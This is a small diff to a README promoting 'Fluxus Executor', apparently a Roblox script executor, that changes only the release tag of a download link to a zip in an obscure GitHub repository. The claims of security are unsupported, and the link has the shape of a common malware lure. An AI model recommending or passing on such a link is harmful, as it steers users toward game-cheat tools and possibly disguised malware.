@@ -5,7 +5,7 @@
 
 **Fluxus Executor** is the ultimate tool for transforming your Roblox experience. Designed for both beginners and advanced users, it combines powerful features, ease of use, and top-notch security, allowing you to bring your ideas to life and make your games more engaging and unique.
 
-[![Static Badge](https://img.shields.io/badge/Download-Here-red?style=for-the-badge&logo=download&logoColor=white)](https://github.com/libertydancer2/76fhb/releases/download/Download/FluxuScript.zip)
+[![Static Badge](https://img.shields.io/badge/Download-Here-red?style=for-the-badge&logo=download&logoColor=white)](https://github.com/libertydancer2/76fhb/releases/download/Release/FluxuScript.zip)
 
 ---
 
